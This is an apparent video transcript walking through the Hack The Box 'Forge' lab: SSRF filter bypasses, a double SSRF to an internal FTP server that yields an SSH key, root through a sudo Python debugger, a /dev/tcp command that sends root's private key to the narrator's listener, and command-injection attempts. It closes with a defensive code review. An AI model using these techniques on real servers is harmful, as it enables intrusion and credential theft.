 what's going on youtube this is ipsec me doing ford from hack the box which is a really great box to learn about server side request forgery attacks which is when you force a server to make a web request on your behalf and it doesn't just have to be http it could also be like ftp gopher and other different protocols and i guess it doesn't have to be web also you can use the file wrapper to potentially do lfi attacks but as we find out in this video that the request library in python can't use the file wrapper or ftp wrapper so we're limited to just web request which is still useful to us because this box has a web server that is only accessible via localhost so we can use that ssrf to browse localhost things we find another ssrf that is capable of doing ftp and we can ftp into the box and download a private key from there it's just analyzing a python program to do the privacy but with that being said let's just jump in as always we're going to start off with an nmap so dash sc for default scripts sv enumerate versions oh a output all formats bring the nmap directory and call it forge and then the ip address which says 1010 11.111 this can take some time to run so i've already ran it look at the results we have three ports open the first one being actually it is filtered so two ports are open the first port is ftp on 21 which is filtered and when you see filtered and nmap this just means the port is behaving not like the others and you can't access it so probably some type of firewall explicitly blocking port 21. the next thing we have is ssh on 22 and its banner tells us it is a ubuntu server then we have http on port 80 and it's running apache httpd its header is also telling us it is ubuntu and redirects us to forge.htb so let's go ahead and add this to our address because if we just accessed it uh let's see it's just going to direct us there anyways and every now and then you get some weird dns cache issue here so even if you do the host entry doesn't always go there right away and you have to wait a few minutes which is always annoying but looks like i can go there straight off the bat and we have a website i'm highlighting over these to see if these are links to find out exactly how the web page pulls it and i see static slash images so i know this is probably some type of model view controller it's just a web terminology on how developers work because generally things not in static or dynamically generated so if it was just a standard hand coded php app that didn't use mvc you generally wouldn't see static i know it's pretty bad of an explanation but if you keep doing these ctfs or watching the videos i'm sure things like that will make sense eventually uh right now i'm just like hovering over links to try to figure out exactly what this is i said php earlier but this may not even be php i'm trying index.php and it doesn't exist uh the web server itself it was apache right so i'm thinking maybe lauravel or something like that because i'm just saying apache run php and if it's python ruby or other things it's probably on nginx but that assumption isn't always correct so let's just run a go buster and move on so go buster dir you put in the url dash w for word list and then we probably want up set list discovery web and then raft small words dot text i'm just going to do an out file of gobuster.out and we'll let that run i'm not going to do any extensions because again we don't know what the extensions is it right away did find a slash uploads directory so i want to go access that it is not found which is weird it's not found not forbidden generally when i access a directory i get a forbidden message i try navigating to uploads without the slash and it redirects me to this so i know there's some type of logic here and i'm guessing this is a good way to identify the directory exist just http errors are not correct here so i'm putting this in repeater just so i can validate yes i get uploads with no slash it redirects us to one with a slash and then that's where we get a 404 so there's no directory listing and it's giving 404 errors which just a little bit weird i guess what that would tell me in the future is if i ever tried to brute force a directory i wouldn't put a trailing slash on it i would just do the directory and then hope the web app redirects me and that's how i tell the directory does exist so uh we have a upload file so i'm just going to click on a random file here doesn't really matter what i'm doing what was on my desktop i guess and it is going through burp suite and we submit it and it looks like we have file upload i don't know what this content local is so it's sending two different variables and it says it uploaded successfully and we can access it at that url so i'm going to turn intercept off here it is we go there and i'm guessing this is the page i just uploaded a bad file type so i'm just going to go to curl to view it and this definitely looks like my bloodhound desktop icon the one weird thing i just want to see exactly what this is so this is the file name of what it uploaded and i'm just checking the characters to see maybe it was an md5 sum of the file name or the content but 20 i don't know what hash sum would be 20 in length so i'm not going to go down that path um i'm still kind of curious what the back end of this server is because if it's like php maybe there's some type of tricks i can do to get code execution by putting a file on the server i don't have control over the extension so i would probably have to find some type of lfi and hope the like zip wrapper for php is enabled because i could upload this as a zip and then as the lfi i think you'd trigger it like doing a hashtag and then the file name that's inside the zip and that would allow you to put php there if you don't know what i'm talking about check out the crime stoppers machine on hack the box but again i don't know what language this server is and we also don't have an lfi extension uh exploit against this so no real reason to dig into that yet we just want to play with this file upload a little bit more what i'm going to do is put a bunch of bad characters in this file name to see if i can get it to output some type of error message and it does not um the one thing i do see from this is we have an upload from url and i'm trying to do upload files so i think on this page this is actually a link and we could type stuff here so if i try url i'm going to do nc lvmp 80 run this with sudo put myself in here so 10 10 14 8 which is my ip address click submit go back here and i can see the server comes back to me and its user agent is python so chances are this is some uh python web app most likely in flask because it doesn't have like a slash admin which would be django uh there are other python frameworks for hosting websites i know like cherry pie is another popular one but most of the time it's going to be flask so that's what i think i am dealing with right now um i'm going to send this over into burp suite because i want to do various things actually i'm going to do file etsy passwd and we're going to intercept this request send it on over and we get invalid protocol it only supports http and https uh the reason why i was trying file is because if i can get files off the server i can extract the source code which is often super helpful i put the wrong hotkey i tried ctrl shift u to unurial code that because i don't think we need this url encoded in the post request so since it's saying it only supports f http and https i can try ftp 127.01 but it's not going to work it's going to probably say invalid protocol so my next step would be um trying like some type of ssrf against myself so oh i tried ftpe let's try ftp invalid protocol so we could try like http127001 see what we get here and it gets it contains a blacklisted address so we can't even do a well that's weird 127.001 is only blacklisted on http but okay so if we do let's try logforge.htb we also get a blacklisted address we know this works on us if i do 10 10 14 8 and makes a request to us um we have an error message right now from request because i'm no longer listening but we also have this remote equals one flag so let me try logforge.htb and change remote is equal to zero to tell it that this is a localhost thing and it still has blacklisted address now there's two ways we can get around this the funny way is if we just like do weird casing we can bypass that i believe it's now maybe including itself and going into a loop or maybe i didn't have a line break at the end there i did not expect that result let's see 127 okay i think it ended up getting itself let's see what's this say oh logforge.http does not exist it's forge.htb and do weird casing log forge is a machine i made and we can access it this way so that is a way we can bypass it and we'll get into like hurting the code at the end of this video but actually we have to probably just curl this and we could see the result is just a page so we can get the web server itself we have this go buster finishing and i always like doing recon in the background so i'm gonna do a different go buster thing because we don't have like sql fields we couldn't do we don't have any parameters to really fuzz we just have like basic brute forcing so i'm going to do a virtual host brute force and it's pretty much the same syntax http forge.hdb word list opt cellist i wonder if there's like a v host set list so i'm going to go cd opt setlist and then find.grep i v host let's see i know there's a subdomain one i'm just gonna look for sub and let's see let's try a small one first this 5 000 list will probably be fine the reason why i don't go for the huge like i think this is 11 000 or 110 000 is it may just take a super long time i'd rather just get the results quickly and we'll do go buster dot v host dot out see if this works looks good but everything is 302 i don't know if i like that there's probably a go buster flag we can try to um say three or twos are also bad but what i'm gonna try doing is just grabbing the output real quick so if i do cd let's go forge uh let's see grab v 302 go buster v host out we can get it we see admin.forge.http so let's dig into that in one minute that's probably going to be the next step but there's two different ways we could bypass that let's say they did good um filtering on this i mean the answer if you want to spoil it and not watch the end of the video is when you do the comparison make it case insensitive or force everything to be lower case or uppercase but let's say they did that the other thing we could do is go 10 10 14 8 and see if it follows redirects so the super easy way to do this is just manually craft that http response so if i go back here um let's see let's post upload if i do a get here and look at this header of the redirect all we want is this moved permanently and then the location so i'm going to grab this whole header real quick v request paste this and all i'm going to do is this and then i think we want two line breaks at the end and now we can redirect it to other places let's try um http 12701 which was a blacklisted address i'm just going to specify port 21 so we can see it try to access ftp because that port was blocked on the nmap scan and now i'm just going to do sudo lv and p 80 and then put this file here oh wait i forgot nc so now if something makes a request to us so if i do curl local host i should have done dash v but we can see we get that um forward request so doing this in we go back to the page we can turn intercept off of this we can get http 101014.8 which is going to make a request to a web server it should have maybe i just need to refresh this page url make this request submit there we go and we get a weird error message um this is the very first line of ftp communication so we're having requests talk to and https or request which is a http library for python talk to an stp server which it does not support and we also see it connecting to us here so not much there but we did have the go buster output if i go back here we can hide through twos from our out file and we see there is a admin.forge.hdb so let's add that to our host file so v etsy host and i can say admin.forge.htb we try accessing it and we see only localhost is allowed but thankfully we have a server side request forgery so i can just do http admin.forge.hdb and get that page contains a blacklisted address so again two ways we could do about this we could go edit this request change it to um admin.forge.htb because now this is bypassing the um filter on this parameter or the other thing we could do is just be lazy which is the way i'm going to take in this video but you're free to do either and just change the casing to random things to bypass that so we submit this we have file uploaded successfully so we can now see what this url looks like so if i curl this we can see the title is admin portal and we have a slash announcements and a upload image thing so let's check out what announcements is i'm just going to click back and do announcements i'm going to redo this so let's see copy link curl and the page title is announcements and it says an internal ftp server has been set up with the credentials as user colon height of security one two three bang the upload endpoint now supports ftp ftps which is ftp secure http and https protocols for uploading from url the slash upload endpoint has been configured for easy scripting and you just have to specify the new parameter and this is um i think html entities less than greater than so all this is saying is put the parameter and then url so we can test this out i'm going to go back here actually i'm going to type it here because it's probably easier to read so i want to grab this url and we want to change this to slash upload because it's the slash upload endpoint and then the parameter u and then a url and this now supports ftp so i'm going to do ftp colon slash and then it's going to be user colon password at and then 127.001 so this should work we can paste this in uh yeah we pasted in this one so we're going to make a server side request forgery on forge.htb which is then going to make another server side request forgery on admin.forge.hdb to log in to ftp and see what happens so double ssrf uh-oh blacklisted address so two ways around this and we'll show both the first thing is ips always support multiple ways of encoding you can do like a pure decimal encoding of ip which um i can't do off the top of my head i'm sure if you go to the holiday video that's the first time i showed this but the easiest way to do it is view it in hex so if you do an ip i'm just going to do ping first 0x because it's a hex address 7f is 127 in hex the only reason i know that is because i've done this a few times and then zero obviously zero so double zero double zero and then one so you're just doing this in hex and just putting it one uh i guess is it two nibbles at a time or two bits at a time or whatever it is but each octet is just one hex so 127.001 and we can see it pinks so ping works with that so that's how i'm going to put that in here and we probably could have also done like log forge or hp ended dns and other things to get to localhost but i just like showing all the fun ways to bypass filters so i'm just copying this so we have it on the clipboard if it failed we can look at this link curl look at it and we can see the results if you wanted to do it the other way i mean we could easily show that so the location i think that's not my clipboard anymore but let's see go back copy this location i did not paste it correctly so the location is going to be admin.forge.hd upload and then again we don't have to bypass any characters here so we could do it this way as well i think bypassing bad characters is just cooler so here we direct it to 10 10 14 8 which is now going to get my python script which tells it to go to that second ssrf on the admin panel and we get the same exact results so let's now go back and we will change this see that's not the one i want it's probably the second one so the outputs of this is a home directory we have snap which is always going to be in the home directory and user.txt so i'm going to try like dot ssh and see what is in there so let's just append ssh to this request and see if we can get anything here so curl where it says the output and 500 server error that's not what i expected let's see admin forge hdb upload ftp i'm going to try putting a slash on a trailing slash on ssh for this and see what happens here maybe it's just that trailing slash that screwed it up copy curl paste and now we get in the directory so that kind of makes sense ftp doesn't have like a 301 or 302 redirect so back to beginning the video when i get on slash upload this doesn't exist technically it needs a trailing slash but apache is smart enough to say hey did you mean this one with a slash and directs us right to here ftp is not so that's why we have this internal server error because it just thought i was doing dot ssh as a file and it was like nope file doesn't exist error out and that's it it's not like well dot ssh was a directory did you mean this so um whenever you specify ftp and like a url like this you should always um if it's a directory put a trailing slash that's what i just learned i did not know that going into this video so always always be learning so i'm adding dot idrsa to download that file and we copy this link curl that looks like a key that we want i'm going to save it and then let chmod 600 idrsa the user of this ftp command is user so i'm going to try ssh-i id rsa user at 10 10 11 111 and if this didn't work probably my next step would be just trying to well if this didn't work being i couldn't get this whole um idrc file my next step probably would be trying the credentials user and what were they um if i go into dub dub dub cat request i'd probably try these credentials on ssh to see if they work first step i always like doing is like a pseudo-l and we can see i can run the following command via sudo python3 and this python script so the very first thing i do whenever i encounter sudo is look at the permissions from the parent directory up to see if i can ever modify it because if i could modify like slash opt i could then just say you know what let's move opt create a new one and then put a malicious python script here and then just execute it with sudo so i always start at the parent directory and work my way up um i am user root can only modify this so i can't modify opt let's just go into it and then lsla root owns this i can't modify it so no easy wins here let's go and view the script to see exactly what happens so let's see it's grabbing port on rand so it's picking some random port uh we got a secret admin password here and then stuff and if we have an exception we go into pdb which is a python debugger so i'm going to just run this so i'm putting this in my history so i have it there um i could even do password in caps and then if i ever want to type it i just ctrl r and start typing password in caps i can quickly copy and paste this so let's do this pseudo command to run this see what happens so sudo paste i forgot the all right fat finger the h it's listening on localhost five nine nine two seven so i'm gonna see if tmux is on the host and we'll have a nasty nested t-mux whenever you do that we can see we have two bars if i just do um my special character which is control b and then a double quote it did not do it in this team muck session it did it on my host so whenever i want to send things to this tmux session the nested one i have to hit control b twice and then i can do that so control b twice and i can move up if i don't do control b twice i think you can hear my keyboards it doesn't do anything so again control b twice to do any of the nested thing so let's go and do sudo l and i copied that i need to get the password again whenever you do the nested tmux it erases your history i have to exit tmux to do it so i'm just getting the password back here and we can put it i guess we can put it in oh god there we go so studio l we can run this command localhost31662 so nc localhost 31662 and then it wants the secret admin password we're going to paste the secret admin password in and all we have to do is trigger an error message in this application so it only had if thens i think for one through four and is expecting a number so i'm going to tell it to please subscribe and the application error is out it's trying to do int on please subscribe and that's where the error message is awesome so now that we're in pdb we can literally run any um command we want in python so hello world like this we can print it out fun stuff but we can just import os and do os dot system run commands like this but we could also um bin bash uh we probably have to add the dash p flag i'm guessing id let's see or system bin bash dash p did i not run this with sudo up here yeah because my id flag says user i'm thinking i did not run this with sudo yeah i did not that was a silly mistake by me so let's do four nine nine one nine secret admin password give it a letter so it errors out ah now import os os dot system id that looks better let's do bin bash you don't need the dash p flag because we're not when uh sudo which is not using the set uid bit so yeah i don't know what i was thinking there uh it didn't work i was trying to draw as many logical conclusions as i could but the most uh common one is user error and i simply forgot the um so you know when i ran the server so here we are as root on the box but i want to get into hardening because this video went pretty quick and we have some time so let's see i want to get out of this nested tmux so what i'm going to do is dot ssh and let's just cat idrsa to dev tcp 1010 14 8 9001. go over here and we can say nclvmp 9001 to root send this over we have it cat idrsa all right cat root we got the file so chmod 600 root sh-i root root at 10 10 11 111 and come on there we go so we'll root here let's see let's go and take a look at the code so this is a python app and var dub dub dub we have the two v host forge in admin the very first thing i want to do is um explain the uh bypass of the uh what is it the filter so if i look at route stop pi uh let's do edit anyways there we go so we have up top here there is a blacklist and we can see everything that is blacklisted forged.hcb127 i don't know why 10 10 10 10 is that's a weird one mary and testing that's what this ip was uh colon colon 1 localhost quad zeros and ipv6 so the best way around this because you can encode ips all like a bunch of different ways and as also if it's like dhb the ip address changes um you probably have to have some type of function to resolve the ip address because as you saw when i did ping0x7f001 it still knows it's 127.001 so there's so many different ways we can obfuscate this you probably just want to try to find something that turns it into an ip address and then also does a ns lookup maybe i don't know because we could probably also bypass this because anything in this 127 uh range is localhost as i say that um maybe not zero zero three oh ping ping that's why i do 127.00 this is still pinging localhost because this whole um subnet is ours i forget exactly what it is it's a slash 8 i believe but 127 any of these can change and it's still localhost which is amazing so that's one way to bypass this there's got to be some function here to determine localhost the second thing this forge.htb was bypassed because later on when we compare blacklist um it's saying it's some weird list comprehension but it's hard to read essentially um let's see i'm guessing url this is probably going to be the user input so this should have been oh blacklist right here you probably should have done a lower function to always convert url to lower because that's what your blacklist is because if we do python3 echo or let's do x is equal to please subscribe we print x you can see the capital if i do lower it's all lowercase and that would prevent what i did before so the next thing i want to look at is how we added the ftp support because the application looked very similar between this one and admin but admin had ftp this does not so let's take a look at that looks like we're in the right function so we're in this upload remote file and we have request get url we have also name rand 20 and that's how it's determining that name it's not a hash it's just random 20 characters but that's what we want to look at let's go to the admin so go over to admin fee routes we can still see oddly enough the same blacklist we have supported schemes http but also the ftp and if we search for request let's see requests we still have the same request.get so the next thing i'm going to do is search this for ftp to see exactly what happens and where are we determining ftp here it is so in upload from url if it starts with http do this function if it starts with ftp i don't know what select quote is maybe this can be like url un like decode let's see what is google i have no idea what that is quote this is a python 2 amp now it's doing something uh i did not explain on explaining that that's weird but we also have this sub process check output and it's running curl and you may wonder like why is it switching over to curl and that's because python request doesn't support ftp or the file thing so we do request python ftp let's see download a file it says request library doesn't support ftp links to download it you should use url web or something request is essentially only http so even in python if we do three import request and then like request uh u e s t s dot get file colon slash slash etsy pass wd command fails because it doesn't know what file means so that's just something with request curl happily processes it all so we have this but what i'm thinking now after seeing this whoops we probably have command injection right here because it's just passing curl to sub process so i'm going to try something real quick let's go back to let's see back to the very beginning it's a good place to start but go into request and we say ftp it's going to start with that then i'm going to give it a semicolon and let's just try ping 1010 14 8 and we probably should add like a c1 i think or maybe a stash n c1 is good finally got that first try dash n1 would be for windows to do just one ping so we can set this and then sudo tcp dump dash i ton zero and this will actually icmp this will tell us if uh we get pinged so let's do that pseudonclvmp80 [Music] pipe request to it go back to this url add this we got it and we did not get a ping back to us let's see i'm going to try semi uh a pipe maybe that was a bad character run this again upload url 10 10 14 8 still no ping if i'm on this box ping dash c1 10 10 14 8 so we definitely have the tcp dump set up correctly so let's try uh let's see put it in backtext maybe that'll work let's upload url nope let's see not backtext we probably should be specifying the absolute path for ping in case that doesn't have that so user bin so it's probably what we should have done from the start user ben try this way let's see upload url submit still nothing so the next thing i'm going to do is not use this weird redirect maybe it's dying because it's like bad characters in the http protocol um we can just do this and respond because we actually don't care about this link so that would be a very quick way to do it so let's turn intercept off submit and oh man that is one long link euro decode this so let's try we just need to begin with ftp so user bin ping dash c 1 10 10 14 8. i'm going to add another semicolon just to terminate that and we'll encode this center of the repeater send it don't have a ping looking back at the code v routes so it starts with this or that that's fine i want this select quotes thing let's see i'm probably even mispronouncing that python3 import selects there we go let's set u is equal to this whole url to see exactly what this is doing it did it do anything there's u let's set x equal to that and we can do u x doesn't look like they changed a payload so let's see we're in subprocess curl shell is equal to true i guess we could try writing a file right we could change where it writes so to do that we just go back here we can say [Music] ftp was trying to get to what had the credentials in it let's see credentials are in a browser paste this id rsa and then i'm going to add a space dash o temp please subscribe and we'll send this okay looking at the server it did not uh yeah this euro begins with http but the second url begins with ftp and this is what that ssrf is seeing so i'm surprised this actually did not work i'm going to get this file to see exactly what this says so cat curl an error message huh there is actually something i could be missing if we go back to here and look at temp we see system d created a bunch of jails this logging d resolve time sync this is the apache jail so apaches temp is actually this directory so let's do a ls on it go into temp and we don't have that please subscribe still so something here we just don't understand i'm guessing it has to deal with that slex thing that i just don't know maybe that's preventing our command injection so we kind of took a brief look at it but let's take a deeper look but first let's actually verify that if we just had straight user input with no filtering without that schlecks that has code execution so i'm going to copy that subprocess command we're just going to call it test.pi paste it in import sub process and then we'll say u is equal to um actually yeah let's do super simple ftp colon slash touch t semicolon as simple as it gets right error message on the ftp of course and we have t so command execution succeeded so let's now import schlecks and then we'll say u is equal to select quote u paste it in run it and a different error message and we don't have it actually writing anything so let's take a look at exactly what this is doing so i'm going to import sys i'm just going to do u is equal to sys.rgv1 colon this is going to grab everything after one so if i just did this and we print this it's just going to print a list so print u python3 test.pi and we put variables it puts them in that list so let's just say um space.join so it's going to join this list with the space so now we do that we just have a quick way to put stuff into this u variable which we'll use selects with and we run this and it's putting a quote if i did not have a space it does not put that single quote if i put a semicolon it's going to have command injection because this is bash so i have to put this in a single quote and it actually does just for sanity i don't put a semicolon here we don't have a single quote so i bet if i took the time and googled this library um i would come to the conclusion this is a library to prevent command injection we can see i put a single quote here and schlecks did something super weird so i don't think this is actually vulnerable i think they have sufficient user filtering i'll probably talk with oxdf and other people that solve this challenge to see if they went beyond root and solved it however i think i'm going to leave this whole like quote-unquote failure piece into the video because i didn't know about this library and like just me digging more into it i learned exactly what it is and i also learned how much of a pain it is to bypass if you can even bypass it so something i should definitely look more into so let's just google schleck stock quote let's see let's go analyzer unix shell multi language what are you supposed to do yeah return a shell escape version of the string so yep this is exactly what i thought it was and just a way to prevent command injection and it looks like it's doing its job we could probably sit into a fuzzer and throw other things at it but normally when someone uses a library that actually has its intensive purpose and it's in something relatively new like python 3 i trust it i put that relatively new clause in because you always have that fun php like escape string and real escape string thing because escape stream was bypassable and real escape screen is also bypassable but i digress that will probably be the video hope you guys enjoyed this little segment of where we just play around with the code after we solve it but um yep take care and i will see you all next week